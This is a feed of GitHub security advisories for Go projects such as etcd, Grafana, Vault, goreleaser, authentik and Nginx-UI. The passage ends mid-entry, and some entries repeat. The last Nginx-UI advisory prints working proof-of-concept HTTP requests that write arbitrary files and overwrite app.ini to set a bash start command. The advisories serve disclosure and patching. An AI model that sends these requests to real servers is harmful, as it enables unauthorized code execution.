{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Access Controls</p>\n<h3 id=\"detail\">Detail</h3>\n<p>etcd creates certain directory paths (etcd data directory and the directory path when provided to automatically generate self-signed certificates for TLS connections with clients) with restricted access permissions (700) by using the os.MkdirAll. This function does not perform any permission checks when a given directory path exists already.</p>\n<h3 id=\"specific-go-package-affected\">Specific Go Package Affected</h3>\n<p>github.com/etcd-io/etcd/pkg/fileutil</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Make sure these directories have the desired permit (700).</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15113\">https://nvd.nist.gov/vuln/detail/CVE-2020-15113</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b\">https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2\">https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/advisories/GHSA-chh6-ppwq-jh92</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92",
            "title": "[github.com/etcd-io/etcd] Improper Preservation of Permissions in etcd",
            "date_modified": "2024-01-30T23:54:27.000Z",
            "date_published": "2024-01-30T23:54:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"vulnerability-type\">Vulnerability type</h3>\n<p>Access Controls</p>\n<h3 id=\"detail\">Detail</h3>\n<p>etcd creates certain directory paths (etcd data directory and the directory path when provided to automatically generate self-signed certificates for TLS connections with clients) with restricted access permissions (700) by using the os.MkdirAll. This function does not perform any permission checks when a given directory path exists already.</p>\n<h3 id=\"specific-go-package-affected\">Specific Go Package Affected</h3>\n<p>github.com/etcd-io/etcd/pkg/fileutil</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Make sure these directories have the desired permit (700).</p>\n<h3 id=\"references\">References</h3>\n<p>Find out more on this vulnerability in the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf\">security audit report</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Contact the <a href=\"https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc\">etcd security committee</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/etcd-io/etcd/security/advisories/GHSA-chh6-ppwq-jh92</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15113\">https://nvd.nist.gov/vuln/detail/CVE-2020-15113</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b\">https://github.com/etcd-io/etcd/commit/6be5c54c94298ae6746a574d2af8227d0c9a998b</a></li>\n<li><a href=\"https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2\">https://github.com/etcd-io/etcd/commit/e5424fc474b274c9e6b5205165015bc2035745f2</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chh6-ppwq-jh92\">https://github.com/advisories/GHSA-chh6-ppwq-jh92</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92",
            "title": "[github.com/etcd-io/etcd] Improper Preservation of Permissions in etcd",
            "date_modified": "2024-01-30T23:54:27.000Z",
            "date_published": "2024-01-30T23:54:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chh6-ppwq-jh92"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana 5.3.1 has XSS via a link on the \"Dashboard &gt; All Panels &gt; General\" screen. NOTE: this issue exists because of an incomplete fix for CVE-2018-12099.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-18625\">https://nvd.nist.gov/vuln/detail/CVE-2018-18625</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/11813\">https://github.com/grafana/grafana/pull/11813</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/14984\">https://github.com/grafana/grafana/pull/14984</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20200608-0008/\">https://security.netapp.com/advisory/ntap-20200608-0008/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6wh2-8hw7-jw94\">https://github.com/advisories/GHSA-6wh2-8hw7-jw94</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6wh2-8hw7-jw94",
            "title": "[github.com/grafana/grafana] Grafana XSS via adding a link in General feature",
            "date_modified": "2024-01-30T23:47:51.000Z",
            "date_published": "2024-01-30T23:47:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6wh2-8hw7-jw94"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana 5.3.1 has XSS via the \"Dashboard &gt; Text Panel\" screen. NOTE: this issue exists because of an incomplete fix for CVE-2018-12099.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-18623\">https://nvd.nist.gov/vuln/detail/CVE-2018-18623</a></li>\n<li><a href=\"https://github.com/grafana/grafana/issues/15293\">https://github.com/grafana/grafana/issues/15293</a></li>\n<li><a href=\"https://github.com/grafana/grafana/issues/4117\">https://github.com/grafana/grafana/issues/4117</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/11813\">https://github.com/grafana/grafana/pull/11813</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/14984\">https://github.com/grafana/grafana/pull/14984</a></li>\n<li><a href=\"https://github.com/grafana/grafana/releases/tag/v6.0.0\">https://github.com/grafana/grafana/releases/tag/v6.0.0</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20200608-0008/\">https://security.netapp.com/advisory/ntap-20200608-0008/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cmq2-j8v8-2q44\">https://github.com/advisories/GHSA-cmq2-j8v8-2q44</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cmq2-j8v8-2q44",
            "title": "[github.com/grafana/grafana] Grafana XSS in Dashboard Text Panel",
            "date_modified": "2024-01-30T23:47:49.000Z",
            "date_published": "2024-01-30T23:47:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cmq2-j8v8-2q44"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.9.0 through 1.3.3 may, under certain circumstances, have an Entity's Group membership inadvertently include Groups the Entity no longer has permissions to. Fixed in 1.3.4.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10660\">https://nvd.nist.gov/vuln/detail/CVE-2020-10660</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/pull/8606\">https://github.com/hashicorp/vault/pull/8606</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a\">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m979-w9wj-qfj9\">https://github.com/advisories/GHSA-m979-w9wj-qfj9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m979-w9wj-qfj9",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Improper Privilege Management",
            "date_modified": "2024-01-30T23:40:45.000Z",
            "date_published": "2024-01-30T23:40:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m979-w9wj-qfj9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.11.0 through 1.3.3 may, under certain circumstances, have existing nested-path policies grant access to Namespaces created after-the-fact. Fixed in 1.3.4.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10661\">https://nvd.nist.gov/vuln/detail/CVE-2020-10661</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a\">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020\">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>\n<li><a href=\"https://www.hashicorp.com/blog/category/vault/\">https://www.hashicorp.com/blog/category/vault/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j6vv-vv26-rh7c\">https://github.com/advisories/GHSA-j6vv-vv26-rh7c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j6vv-vv26-rh7c",
            "title": "[github.com/hashicorp/vault/vault] HashiCorp Vault Improper Privilege Management",
            "date_modified": "2024-01-30T23:40:41.000Z",
            "date_published": "2024-01-30T23:40:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j6vv-vv26-rh7c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Hello 👋 </p>\n<p><code>goreleaser release --debug</code> log shows secret values used in the in the custom publisher.</p>\n<p>How to reproduce the issue:</p>\n<ul>\n<li>Define a custom publisher as the one below. Make sure to provide a custom script to the <code>cmd</code> field and to provide a secret to <code>env</code></li>\n</ul>\n<pre><code>#.goreleaser.yml \npublishers:\n  - name: my-publisher\n  # IDs of the artifacts we want to sign\n    ids:\n      - linux_archives\n      - linux_package\n    cmd: \"./build/package/linux_notarize.sh\"\n    env:\n      - VERSION={{ .Version }}\n      - SECRET_1={{.Env.SECRET_1}}\n      - SECRET_2={{.Env.SECRET_2}}\n</code></pre>\n<ul>\n<li>run <code>goreleaser release --debug</code></li>\n</ul>\n<p>You should see your secret value in the gorelease log. The log shows also the <code>GITHUB_TOKEN</code></p>\n<p>Example:</p>\n<pre><code>running                                        cmd= ....\nSECRET_1=secret_value\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goreleaser/goreleaser/security/advisories/GHSA-h3q2-8whx-c29h\">https://github.com/goreleaser/goreleaser/security/advisories/GHSA-h3q2-8whx-c29h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23840\">https://nvd.nist.gov/vuln/detail/CVE-2024-23840</a></li>\n<li><a href=\"https://github.com/goreleaser/goreleaser/commit/d5b6a533ca1dc3366983d5d31ee2d2b6232b83c0\">https://github.com/goreleaser/goreleaser/commit/d5b6a533ca1dc3366983d5d31ee2d2b6232b83c0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h3q2-8whx-c29h\">https://github.com/advisories/GHSA-h3q2-8whx-c29h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h3q2-8whx-c29h",
            "title": "[github.com/goreleaser/goreleaser] `goreleaser release --debug` shows secrets",
            "date_modified": "2024-01-30T20:57:55.000Z",
            "date_published": "2024-01-30T20:57:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h3q2-8whx-c29h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>\n<h2 id=\"patches\">Patches</h2>\n<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>\n<h2 id=\"details\">Details</h2>\n<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>\n<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>\n<p>The OAuth BCP (<a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@goauthentik.io\">security@goauthentik.io</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n<li><a href=\"https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a\">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23647\">https://nvd.nist.gov/vuln/detail/CVE-2024-23647</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj",
            "title": "[goauthentik.io] Authentik vulnerable to PKCE downgrade attack",
            "date_modified": "2024-01-30T19:34:59.000Z",
            "date_published": "2024-01-29T22:30:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>\n<h2 id=\"patches\">Patches</h2>\n<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>\n<h2 id=\"details\">Details</h2>\n<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>\n<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>\n<p>The OAuth BCP (<a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@goauthentik.io\">security@goauthentik.io</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n<li><a href=\"https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a\">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23647\">https://nvd.nist.gov/vuln/detail/CVE-2024-23647</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj",
            "title": "[goauthentik.io] Authentik vulnerable to PKCE downgrade attack",
            "date_modified": "2024-01-30T19:34:59.000Z",
            "date_published": "2024-01-29T22:30:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Fix bypass to the following bugs</p>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35</a></li>\n</ul>\n<p>Allowing to inject directly in the <code>app.ini</code> via CRLF to change the value of <code>test_config_cmd</code> and <code>start_cmd</code> resulting in an Authenticated RCE</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Authenticated Remote execution on the host</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23828\">https://nvd.nist.gov/vuln/detail/CVE-2024-23828</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1\">https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qcjq-7f7v-pvc8\">https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qcjq-7f7v-pvc8",
            "title": "[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to authenticated RCE through injecting into the application config via CRLF",
            "date_modified": "2024-01-29T22:30:25.000Z",
            "date_published": "2024-01-29T22:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qcjq-7f7v-pvc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The Import Certificate feature allows arbitrary write into the system. The feature does not check if the provided user input is a certification/key and allows to write into arbitrary paths in the system.</p>\n<p><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></p>\n<pre><code>func AddCert(c *gin.Context) {\n    var json struct {\n        Name                  string `json:\"name\"`\n        SSLCertificatePath    string `json:\"ssl_certificate_path\" binding:\"required\"`\n        SSLCertificateKeyPath string `json:\"ssl_certificate_key_path\" binding:\"required\"`\n        SSLCertificate        string `json:\"ssl_certificate\"`\n        SSLCertificateKey     string `json:\"ssl_certificate_key\"`\n        ChallengeMethod       string `json:\"challenge_method\"`\n        DnsCredentialID       int    `json:\"dns_credential_id\"`\n    }\n    if !api.BindAndValid(c, &amp;json) {\n        return\n    }\n    certModel := &amp;model.Cert{\n        Name:                  json.Name,\n        SSLCertificatePath:    json.SSLCertificatePath,\n        SSLCertificateKeyPath: json.SSLCertificateKeyPath,\n        ChallengeMethod:       json.ChallengeMethod,\n        DnsCredentialID:       json.DnsCredentialID,\n    }\n\n    err := certModel.Insert()\n\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    content := &amp;cert.Content{\n        SSLCertificatePath:    json.SSLCertificatePath,\n        SSLCertificateKeyPath: json.SSLCertificateKeyPath,\n        SSLCertificate:        json.SSLCertificate,\n        SSLCertificateKey:     json.SSLCertificateKey,\n    }\n\n    err = content.WriteFile()\n\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    c.JSON(http.StatusOK, Transformer(certModel))\n}\n</code></pre>\n<p><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></p>\n<pre><code>func (c *Content) WriteFile() (err error) {\n    // MkdirAll creates a directory named path, along with any necessary parents,\n    // and returns nil, or else returns an error.\n    // The permission bits perm (before umask) are used for all directories that MkdirAll creates.\n    // If path is already a directory, MkdirAll does nothing and returns nil.\n\n    err = os.MkdirAll(filepath.Dir(c.SSLCertificatePath), 0644)\n    if err != nil {\n        return\n    }\n\n    err = os.MkdirAll(filepath.Dir(c.SSLCertificateKeyPath), 0644)\n    if err != nil {\n        return\n    }\n\n    if c.SSLCertificate != \"\" {\n        err = os.WriteFile(c.SSLCertificatePath, []byte(c.SSLCertificate), 0644)\n        if err != nil {\n            return\n        }\n    }\n\n    if c.SSLCertificateKey != \"\" {\n        err = os.WriteFile(c.SSLCertificateKeyPath, []byte(c.SSLCertificateKey), 0644)\n        if err != nil {\n            return\n        }\n    }\n\n    return\n}\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>POST /api/cert HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 144\nAccept: application/json, text/plain, */*\nAuthorization: &lt;JWT&gt;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7\nConnection: close\n\n{\"name\":\"poc\",\"ssl_certificate_path\":\"/tmp/test\",\"ssl_certificate_key_path\":\"/tmp/test2\",\"ssl_certificate\":\"test\",\"ssl_certificate_key\":\"test2\"}\n</code></pre>\n<pre><code>root@aze:~/nginx# ls -la /tmp/test*\n-rw-r--r-- 1 root root 4 Jan 24 13:33 /tmp/test\n-rw-r--r-- 1 root root 5 Jan 24 13:33 /tmp/test2\n</code></pre>\n<p>It's possible to leverage it into an RCE in a senario by overwriting the config file app.ini - But it will require the app.</p>\n<pre><code>root@aze:~/nginx# cat app.ini  | grep \"StartCmd\"\nStartCmd          = login\n</code></pre>\n<p>Then we overwrite the <code>StartCmd</code> with <code>bash</code></p>\n<pre><code>POST /api/cert HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 980\nAccept: application/json, text/plain, */*\nAuthorization: &lt;JWT&gt;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7\nConnection: close\n\n{\"name\":\"poc\",\"ssl_certificate_path\":\"/root/nginx/app.ini\",\"ssl_certificate_key_path\":\"/tmp/test2\",\"ssl_certificate\":\"[server]\\r\\nHttpHost          = 0.0.0.0\\r\\nHttpPort          = 9000\\r\\nRunMode           = debug\\r\\nJwtSecret         = 504f334b-ac68-4fbc-9160-2ecbf9e5794c\\r\\nNodeSecret        = 139ab224-9e9e-444f-987e-b3a651175ad5\\r\\nHTTPChallengePort = 9180\\r\\nEmail             = props@pros.com\\r\\nDatabase          = database\\r\\nStartCmd          = bash\\r\\nCADir             = dqsdqsd\\r\\nDemo              = false\\r\\nPageSize          = 10\\r\\nGithubProxy       = dqsdqfsdfsdfsdfsd\\r\\n\\r\\n[nginx]\\r\\nAccessLogPath =\\r\\nErrorLogPath  =\\r\\nConfigDir     =\\r\\nPIDPath       =\\r\\nTestConfigCmd =\\r\\nReloadCmd     =\\r\\nRestartCmd    =\\r\\n\\r\\n[openai]\\r\\nBaseUrl = \\r\\nToken   =\\r\\nProxy   =\\r\\nModel   = \\r\\n\\r\\n[casdoor]\\r\\nEndpoint     =\\r\\nClientId     =\\r\\nClientSecret =\\r\\nCertificate  =\\r\\nOrganization =\\r\\nApplication  =\\r\\nRedirectUri  =\",\"ssl_certificate_key\":\"test2\"}\n</code></pre>\n<pre><code>root@aze:~/nginx# cat app.ini  | grep \"StartCmd\"\nStartCmd          = bash\n</code></pre>\n<p>For the new config to be applied the app needs to be restarted</p>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26652608/299331664-6415a8c1-6611-4e53-8137-3e574c58da28.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary write/overwrite into the host file system with a risk of remote code execution if the app restarts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23827\">https://nvd.nist.gov/vuln/detail/CVE-2024-23827</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199\">https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvq9-4vpv-227m\">https://github.com/advisories/GHSA-xvq9-4vpv-227m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xvq9-4vpv-227m",
            "title": "[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature",
            "date_modified": "2024-01-29T22:30:19.000Z",
            "date_published": "2024-01-29T22:30:18.000Z",
            "author": {
